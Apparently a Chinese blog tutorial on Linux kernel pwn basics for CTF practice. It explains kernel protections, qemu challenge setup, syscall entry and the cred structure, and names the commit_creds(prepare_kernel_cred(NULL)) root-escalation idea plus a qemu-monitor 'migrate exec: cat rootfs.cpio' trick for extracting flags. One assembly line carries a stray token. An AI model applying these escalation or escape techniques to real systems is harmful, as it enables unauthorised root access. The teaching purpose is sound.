usercopy`在用户空间与内核空间之间拷贝数据时进行越界检查，**主要检查拷贝过程中对内核空间中数据的读写是否会越界（包括读写两方面）**。常用于`copy_to_user()`和`copy_form_user()`。\n\n绕过方式：这种保护不适用于内核空间之间的数据拷贝。\n\n###  Hardened freelist\n\n在开启这种保护之前，`slub` 中的 `free object` 的 `next` 指针直接存放着 `next free object` 的地址，攻击者可以通过读取 `freelist` 泄露出内核线性映射区的地址。\n\n在开启了该保护之后 `free object` 的 `next` 指针存放的是由以下三个值进行**异或**操作后的值：\n\n- 当前 `free object` 的地址\n- 下一个 `free object` 的地址\n- 由 `kmem_cache` 指定的一个 random 值\n\n这使得攻击者必须要获取第一和第三个值才能修改`free list`\n\n###  Random freelist\n\n这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是**线性连续**的，但在开启了这种保护之后其上的 object 之间的连接顺序是**随机**的，这让攻击者**无法直接预测**下一个分配的 object 的地址\n\n需要注意的是这种保护发生在**slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO**\n\n###  CONFIG_INIT_ON_ALLOC_DEFAULT_ON\n\n当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），**会将被分配的内存上的内容进行清零**，从而防止了利用未初始化内存进行数据泄露的情况\n\n## kernel pwn相关文件\n\nkernel pwn的题目一般会给以下三个文件：\n\n1. boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关\n2. bzImage: kernel binary\n3. rootfs.cpio: 文件系统映像\n\nqemu部分参数说明如下：\n\n- `-m`：虚拟机内存大小\n- `-kernel`：内存镜像路径(bzimage)\n- `-initrd`：磁盘镜像路径(rootfs.cpio)\n- `-append`：附加参数选项\n    - `nokalsr`：关闭内核地址随机化，方便我们进行调试\n    - `rdinit`：指定初始启动进程，`/sbin/init`进程会默认以 `/etc/init.d/rcS` 作为启动脚本\n    - `loglevel=3 `& `quiet`：不输出log\n    - `console=ttyS0`：指定终端为`/dev/ttyS0`，这样一启动就能进入终端界面\n- `-monitor`：将监视器重定向到主机设备`/dev/null`，这里重定向至null主要是防止CTF中被人给偷了qemu拿flag，遇到没有这一行的可以直接通过`ctrl a + c`进入`qemu`的`monitor`模式，之后通过`migrate \"exec: cat rootfs.cpio 1>&2\"`查看`rootfs.cpio`文件，在其中找`flag`。\n\n- `-cpu`：设置CPU安全选项（如smep保护）\n- `-s`：相当于`-gdb tcp::1234`的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试\n\n","slug":"Kernel_Basic_Knowledge","published":1,"updated":"2023-03-23T13:14:12.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafa00105oud96a25jsc","content":"<p>开始学习kernel pwn，在用户态pwn中，我们需要利用用户态程序的漏洞，劫持该程序的执行流，从该程序中起一个<code>shell</code>，或者走<code>orw</code>获得<code>flag</code>。kernel pwn中类似，我们需要利用内核的漏洞，劫持程序流使其能够提权到<code>root</code>或者使其能泄露敏感信息<code>flag</code>。</p>\n<p><strong>kernel pwn和用户态pwn在本质上并没有区别</strong>，利用思路都是相似的，只是细节上会有所差别。一般来说，kernel pwn也不会让我们找内核中的漏洞，而是给出一个有问题的<code>LKM</code>让我们分析。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Kernel\"><a href=\"#Kernel\" class=\"headerlink\" title=\"Kernel\"></a>Kernel</h2><p>kernel也就是内核，是操作系统的核心部分，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理。kernel处在应用程序和硬件之间，向上对应用程序提供硬件的使用接口，向下按照应用程序的要求与硬件进行交互。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/image-20230115125518678.png\" alt=\"image-20230115125518678\"></p>\n<p>但无论是应用程序还是操作系统，他们始终都是<strong>程序</strong>，他们<strong>都是在物理地址上运行的代码和数据</strong>，他们之间的区别主要在于<strong>权限</strong>。操作系统能够使用<strong>所有的指令</strong>，这使<strong>内核态代码能完全使用所有硬件</strong>，而应用程序只能使用<strong>一部分指令</strong>，这导致<strong>用户态代码只能部分使用硬件</strong>。</p>\n<p>需要注意的是，<strong>kernel 的 crash 通常会引起重启</strong>。</p>\n<h3 id=\"内核架构\"><a href=\"#内核架构\" class=\"headerlink\" title=\"内核架构\"></a>内核架构</h3><p>通常来说我们可以把内核架构分为两种：<code>宏内核</code>和<code>微内核</code>，现在还有一种内核是混合了宏内核与微内核的特性，称为 <code>混合内核</code> ，宏内核和微内核的区别如下：</p>\n<ul>\n<li>宏内核：此架构的特性是<strong>整个内核程序是一个单一二进制可执行文件</strong>，<strong>几乎所有功能都被集成进内核</strong>。在内核态以监管者模式（Supervisor Mode）来运行在一个单独的地址空间<strong>，所有的内核服务都在一个地址空间运行，相互之间直接调用函数</strong>，简单高效。宏内核会定义出一个高端的虚拟接口，由该接口来涵盖描述整个电脑硬件，这些描述会集合成一组硬件描述用词，有时还会附加一些系统调用，如此可以用一个或多个模块来实现各种操作系统服务。</li>\n<li>微内核：内核中只有最基本的调度、内存管理。驱动、文件系统等都是用户态的守护进程去实现的，<strong>微内核中功能被划分成独立的过程</strong>，<strong>过程间通过IPC进行通信</strong>。模块化程度高，一个服务失效不会影响另外一个服务。</li>\n</ul>\n<p><strong>Linux Kernel采用的是宏内核</strong>。</p>\n<h2 id=\"hierarchical-protection-domains（分级保护域）\"><a href=\"#hierarchical-protection-domains（分级保护域）\" class=\"headerlink\" title=\"hierarchical protection domains（分级保护域）\"></a><strong>hierarchical protection domains</strong>（分级保护域）</h2><p>intel CPU将权限划分为<code>Ring0、Ring1、Ring2、Ring3</code>四个等级，就像这四个等级的名字一样，四个等级构成四个环。</p>\n<p>越里面的环的权限越高，使用硬件的能力越强，其中<code>Ring0</code>表示最高权限，<code>Ring3</code>表示最低权限。通过这种方式对计算机的资源进行分级，实现权限的管理。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/image-20230115130938230.png\" alt=\"image-20230115130938230\"></p>\n<p><code>Ring0</code>拥有最高特权，并且可以和最多的硬件直接交互（比如CPU，内存），因此<strong>操作系统内核代码通常运行在 <code>Ring0</code> 下，即 CPU 在执行操作系统内核代码时处在<code>Ring0</code> 下</strong>。</p>\n<p>应用程序代码通常处在<code>Ring3</code>，拥有的权限最低，即 <strong>CPU 在执行用户进程代码时处在 ring3 下</strong>。</p>\n<p>那么什么是用户态，什么是内核态呢？</p>\n<ul>\n<li>用户态：CPU 运行在 <code>Ring3</code> + 用户进程运行环境上下文</li>\n<li>内核态：CPU 运行在 <code>Ring0</code> + 内核代码运行环境上下文</li>\n</ul>\n<h2 id=\"状态切换\"><a href=\"#状态切换\" class=\"headerlink\" title=\"状态切换\"></a>状态切换</h2><p>当发生<strong>系统调用(syscall,int 0x80)，产生异常，外设产生中断</strong>等事件时，会发生<strong>用户态到内核态</strong>的切换，具体的过程为：</p>\n<ol>\n<li>通过 <code>swapgs</code> 切换<code>GS</code>段寄存器，将 <code>GS</code> 寄存器值<strong>和一个特定位置的值进行交换</strong>，目的是保存<code>GS</code>值，同时将该位置的值<strong>作为内核执行时的<code>GS</code>值</strong>使用。</li>\n<li>将当前栈顶（用户空间栈顶）记录在 <strong>CPU 独占变量区域</strong>里，将 CPU 独占区域里记录的<strong>内核栈顶</strong>放入 <code>rsp/esp</code>。</li>\n<li>通过 push 保存各寄存器值:</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ENTRY(entry_SYSCALL_64)</span><br><span class=\"line\"> <span class=\"comment\">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class=\"line\"> SWAPGS_UNSAFE_STACK</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">/* 保存栈值，并设置内核栈 */</span></span><br><span class=\"line\"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class=\"line\"> movq <span class=\"title function_\">PER_CPU_VAR</span><span class=\"params\">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class=\"line\"><span class=\"comment\">/* Construct struct pt_regs on stack */</span></span><br><span class=\"line\">pushq  $__USER_DS      <span class=\"comment\">/* pt_regs-&gt;ss */</span></span><br><span class=\"line\">pushq  <span class=\"title function_\">PER_CPU_VAR</span><span class=\"params\">(rsp_scratch)</span>  <span class=\"comment\">/* pt_regs-&gt;sp */</span></span><br><span class=\"line\">pushq  %r11             <span class=\"comment\">/* pt_regs-&gt;flags */</span></span><br><span class=\"line\">pushq  $__USER_CS      <span class=\"comment\">/* pt_regs-&gt;cs */</span></span><br><span class=\"line\">pushq  %rcx             <span class=\"comment\">/* pt_regs-&gt;ip */</span></span><br><span class=\"line\">pushq  %rax             <span class=\"comment\">/* pt_regs-&gt;orig_ax */</span></span><br><span class=\"line\">pushq  %rdi             <span class=\"comment\">/* pt_regs-&gt;di */</span></span><br><span class=\"line\">pushq  %rsi             <span class=\"comment\">/* pt_regs-&gt;si */</span></span><br><span class=\"line\">pushq  %rdx             <span class=\"comment\">/* pt_regs-&gt;dx */</span></span><br><span class=\"line\">pushq  %rcx tuichu    <span class=\"comment\">/* pt_regs-&gt;cx */</span></span><br><span class=\"line\">pushq  $-ENOSYS        <span class=\"comment\">/* pt_regs-&gt;ax */</span></span><br><span class=\"line\">pushq  %r8              <span class=\"comment\">/* pt_regs-&gt;r8 */</span></span><br><span class=\"line\">pushq  %r9              <span class=\"comment\">/* pt_regs-&gt;r9 */</span></span><br><span class=\"line\">pushq  %r10             <span class=\"comment\">/* pt_regs-&gt;r10 */</span></span><br><span class=\"line\">pushq  %r11             <span class=\"comment\">/* pt_regs-&gt;r11 */</span></span><br><span class=\"line\">sub $<span class=\"params\">(<span class=\"number\">6</span>*<span class=\"number\">8</span>)</span>, %rsp      <span class=\"comment\">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>通过汇编指令判断是否为 <code>x32_abi</code>（表示是否为32位系统）。</li>\n<li>通过<strong>系统调用号</strong>，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li>\n</ol>\n<p>当在内核态中的工作执行完时，会从<strong>内核态返回用户态</strong>，过程如下：</p>\n<ol>\n<li>通过 <code>swapgs</code> 恢复<code>GS</code>值</li>\n<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li>\n</ol>\n<h2 id=\"系统调用\"><a href=\"#系统调用\" class=\"headerlink\" title=\"系统调用\"></a>系统调用</h2><p>系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。当用户空间的程序利用现有权限无法满足需求时，就会进行系统调用向操作系统内核请求需要更高权限的服务。在这个过程中，用户进程会<strong>暂时陷入内核态，待内核工作完成后再返回用户态</strong>。</p>\n<p>64位和32位的系统调用号分别存放在 <code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code> 和 <code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code> 。</p>\n<p>根据系统位数不同，Linux 下系统调用的方式也不同：</p>\n<ul>\n<li>32位：执行 <code>int 0x80 </code>汇编指令（80号中断）</li>\n<li>64位：执行 <code>syscall</code> 汇编指令 / 执行 <code>sysenter</code> 汇编指令（only intel）</li>\n</ul>\n<p>用户态进入到内核态的流程如下：</p>\n<p>通过<code>eax/rax</code>寄存器存放<strong>系统调用号</strong>，并通过寄存器存放该系统调用的参数：</p>\n<ul>\n<li>32 位：<code>ebx、ecx、edx、esi、edi、ebp</code>作为第一个参数、第二个参数…进行参数传递</li>\n<li>64 位：<code>rdi、rsi、rdx、rcx、r8、r9</code>作为第一个参数、第二个参数…进行参数传递</li>\n</ul>\n<p>同样地，内核执行完系统调用后退出系统调用也有对应的两种方式：</p>\n<ul>\n<li>执行<code>iret</code>汇编指令</li>\n<li>执行 <code>sysret</code> 汇编指令 / 执行<code>sysexit</code>汇编指令（only Intel）</li>\n</ul>\n<h2 id=\"进程权限管理\"><a href=\"#进程权限管理\" class=\"headerlink\" title=\"进程权限管理\"></a>进程权限管理</h2><p>kernel调度所有计算机资源，并为应用程序提供他们的抽象，相应的，应用程序的权限也由kernel来管理，kernel决定一个应用程序是否有权限使用某一抽象。</p>\n<p>在内核中使用结构体 <code>task_struct</code> 表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中，其中的内容大致如下：</p>\n<p><img src=\"./Kernel_Basic_Knowledge/2W8xIfwqm9Y7Fru.png\" alt=\"img\"></p>\n<h3 id=\"结构体cred\"><a href=\"#结构体cred\" class=\"headerlink\" title=\"结构体cred\"></a>结构体cred</h3><p>在结构体<code>task struct</code>中就包含有权限的信息，<strong>Process credentials</strong> 就是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p>\n<ul>\n<li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）</li>\n<li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li>\n<li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li>\n</ul>\n<p>一般情况下，主体凭证与客体凭证的值是相同的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Process credentials: */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>        *<span class=\"title\">ptracer_cred</span>;</span> <span class=\"comment\">//gdb调试使用该cred</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Objective and real subjective task credentials (COW): */</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>        *<span class=\"title\">real_cred</span>;</span> <span class=\"comment\">//进程最初的权限</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>        *<span class=\"title\">cred</span>;</span> <span class=\"comment\">//进程当前的权限</span></span><br></pre></td></tr></table></figure>\n\n<p>结构体<code>cred</code>定义于内核源码<code>include/linux/cred.h</code>中，用于表示权限凭证：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">atomic_t</span>    usage;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class=\"line\">    <span class=\"type\">atomic_t</span>    subscribers;    <span class=\"comment\">/* number of processes subscribed */</span></span><br><span class=\"line\">    <span class=\"type\">void</span>        *put_addr;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span>    magic; <span class=\"comment\">//可用于寻找cred结构体</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CRED_MAGIC    0x43736564</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CRED_MAGIC_DEAD    0x44656144</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    <span class=\"comment\">//各种ID</span></span><br><span class=\"line\">    <span class=\"type\">kuid_t</span>        uid;        <span class=\"comment\">/* real UID of the task */</span> </span><br><span class=\"line\">    <span class=\"type\">kgid_t</span>        gid;        <span class=\"comment\">/* real GID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kuid_t</span>        suid;        <span class=\"comment\">/* saved UID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kgid_t</span>        sgid;        <span class=\"comment\">/* saved GID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kuid_t</span>        euid;        <span class=\"comment\">/* effective UID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kgid_t</span>        egid;        <span class=\"comment\">/* effective GID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kuid_t</span>        fsuid;        <span class=\"comment\">/* UID for VFS ops */</span></span><br><span class=\"line\">    <span class=\"type\">kgid_t</span>        fsgid;        <span class=\"comment\">/* GID for VFS ops */</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">unsigned</span>    securebits;    <span class=\"comment\">/* SUID-less security management */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_inheritable; <span class=\"comment\">/* caps our children can inherit */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_permitted;    <span class=\"comment\">/* caps we&#x27;re permitted */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_effective;    <span class=\"comment\">/* caps we can actually use */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_bset;    <span class=\"comment\">/* capability bounding set */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_ambient;    <span class=\"comment\">/* Ambient capability set */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_KEYS</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span>    jit_keyring;    <span class=\"comment\">/* default keyring to attach requested</span></span><br><span class=\"line\"><span class=\"comment\">                     * keys to */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>    *<span class=\"title\">session_keyring</span>;</span> <span class=\"comment\">/* keyring inherited over fork */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>    *<span class=\"title\">process_keyring</span>;</span> <span class=\"comment\">/* keyring private to this process */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>    *<span class=\"title\">thread_keyring</span>;</span> <span class=\"comment\">/* keyring private to this thread */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>    *<span class=\"title\">request_key_auth</span>;</span> <span class=\"comment\">/* assumed request_key authority */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_SECURITY</span></span><br><span class=\"line\">    <span class=\"type\">void</span>        *security;    <span class=\"comment\">/* subjective LSM security */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span>;</span>    <span class=\"comment\">/* real user ID subscription */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_namespace</span> *<span class=\"title\">user_ns</span>;</span> <span class=\"comment\">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group_info</span> *<span class=\"title\">group_info</span>;</span>    <span class=\"comment\">/* supplementary groups for euid/fsgid */</span></span><br><span class=\"line\">    <span class=\"comment\">/* RCU deletion */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> non_rcu;            <span class=\"comment\">/* Can we skip RCU deletion? */</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rcu_head</span>    <span class=\"title\">rcu</span>;</span>        <span class=\"comment\">/* RCU deletion hook */</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>\n\n<p><code>cred</code>结构体中记录了<strong>一个进程四种不同种类的UID（用户ID）和GID（组ID）</strong>：</p>\n<ul>\n<li><strong>真实ID</strong>（real ID）：标识一个进程<strong>启动时的ID</strong></li>\n<li><strong>保存ID</strong>（saved ID）：标识一个进程<strong>最初的有效ID</strong></li>\n<li><strong>有效ID</strong>（effective ID）：标识一个进程<strong>正在运行时所属的ID</strong>，一个进程在运行途中是可以改变自己所属用户和组的，因而权限机制也是<strong>通过有效ID进行认证</strong>的，内核通过有效ID来进行特权判断；为了防止用户一直使用高权限，<strong>当任务完成之后，有效ID会与保存ID进行交换</strong>，恢复进程的有效权限</li>\n<li><strong>文件系统ID</strong>（ID for VFS ops）：标识一个进程<strong>创建文件时进行标识的ID</strong></li>\n</ul>\n<p>通常情况下这几个ID都是相同的。</p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>一个进程的权限是由位于内核空间的<code>cred</code>结构体进行管理的，因此只要改变一个进程的<code>cred</code>结构体，就能改变其执行权限，在内核空间有如下两个函数，都位于<code>kernel/cred.c</code>中，可以用于改变<code>cred</code>结构体：</p>\n<ul>\n<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li>\n<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li>\n</ul>\n<p>在<code>prepare_kernel_cred()</code>函数中，若传入的参数为NULL，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong></p>\n<p>那么我们不难想到，只要我们能够**在内核空间执行<code>commit_creds(prepare_kernel_cred(NULL))</code>**，那么就能够将当前进程的权限提升到<code>root</code></p>\n<h2 id=\"文件\"><a href=\"#文件\" class=\"headerlink\" title=\"文件\"></a>文件</h2><p>Linux系统的设计中秉承着<strong>万物皆文件</strong>的思想，因此<strong>所有计算机资源都被抽象为文件</strong>，无论是硬件设备、目录、普通文件、管道，甚至进程、磁盘都被抽象成文件。基于这种设计，<strong>所有计算机资源都可以通过访问文件的形式进行操作，所有读操作都可以使用<code>read</code>完成，所有写操作都可以使用<code>write</code>完成</strong>，所有操作最后都可以以读写的方式实现。</p>\n<h3 id=\"进程文件系统\"><a href=\"#进程文件系统\" class=\"headerlink\" title=\"进程文件系统\"></a>进程文件系统</h3><p>我们知道Linux系统中的进程也被抽象成了文件，那就代表它的数据以文件的形式存放，并且我们可以通过访问文件的形式对其进行读写。</p>\n<p>进程文件系统（process file system， 简写为procfs）用以描述一个进程，其中包括该进程所打开的文件描述符、堆栈内存布局、环境变量等等。它本身是一个伪文件系统，通常被挂载到<code>/proc</code>目录下，并不真正占用储存空间，而是占用一定的<strong>内存</strong>。当一个进程被建立起来时，其进程文件系统便会被**挂载到<code>/proc/[PID]</code>**下，我们可以在该目录下查看其相关信息。</p>\n<h3 id=\"文件的访问\"><a href=\"#文件的访问\" class=\"headerlink\" title=\"文件的访问\"></a>文件的访问</h3><p>进程通过<strong>文件描述符</strong>（<strong>file descriptor</strong>）来完成对文件的访问，文件描述符是一个非负整数，本质上是对文件的索引值，进程所有执行 I/O 操作的系统调用都会通过文件描述符来找到对应文件。</p>\n<p>每个进程都<strong>独立有着一个文件描述符表</strong>，存放着该进程所打开的文件索引，每当进程<strong>成功</strong>打开一个现有文件/创建一个新文件时（通过系统调用open进行操作），<strong>内核会向进程返回一个文件描述符</strong>。在kernel中有着一个文件表，由所有的进程<strong>共享</strong>。</p>\n<p>详细可以回看<code>IO_FILE</code>部分。</p>\n<h3 id=\"iotcl\"><a href=\"#iotcl\" class=\"headerlink\" title=\"iotcl\"></a>iotcl</h3><p>操作系统向应用程序提供了系统调用，使应用程序可以<strong>通过内核访问标准外部设备</strong>，因为大多数硬件设备只能够在内核空间内直接寻址。</p>\n<p>但是当访问<strong>非标准</strong>硬件设备时，使用系统调用显得不合适， 因为部分设备可能没有被内核考虑到，这样应用程序就无法使用该设备了，这时候就需要用户模式直接访问设备。</p>\n<p>为了解决这个问题，内核被设计成<strong>可扩展</strong>的，可以加入一个称为<strong>设备驱动</strong>的模块，<strong>驱动的代码允许在内核空间运行而且可以对设备直接寻址</strong>。并且预留了一个<strong>系统调用<code>iotcl</code>用于用户空间和设备驱动的通信</strong>。</p>\n<p>对设备驱动的请求是一个<strong>以设备和请求号码为参数</strong>的<code>ioctl</code>调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">ioctl</span><span class=\"params\">(<span class=\"type\">int</span> fd, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> request, ...)</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>fd：设备的文件描述符</strong></li>\n<li><strong>request：请求码</strong></li>\n<li><strong>其他参数</strong></li>\n</ul>\n<h2 id=\"Loadable-Kernel-Modules-LKMs\"><a href=\"#Loadable-Kernel-Modules-LKMs\" class=\"headerlink\" title=\"Loadable Kernel Modules(LKMs)\"></a>Loadable Kernel Modules(LKMs)</h2><p>Linux Kernel采用宏内核架构，一切的系统服务都需要由内核来提供，虽然效率较高，但是<strong>缺乏可扩展性与可维护性</strong>。同时内核需要装载很多可能用到的服务，但这些服务最终可能未必会用到，还会<strong>占据大量内存空间</strong>，如果要加入的新服务往往意味着要<strong>重新编译整个内核</strong>。</p>\n<p><strong>可加载内核模块（Loadable Kernel Modules，即LKMs）</strong>的设计就是为了解决上述问题。在内核空间运行的LKMs可以为应用程序提供<strong>新的系统调用或服务</strong>，同时LKMs可以像积木一样从内核中被<strong>装载/卸载</strong>，大大提高了kernel的可拓展性与可维护性</p>\n<p>可加载内核模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p>\n<ul>\n<li>驱动程序（Device drivers）<ul>\n<li>设备驱动</li>\n<li>文件系统驱动</li>\n<li>…</li>\n</ul>\n</li>\n<li>内核扩展模块 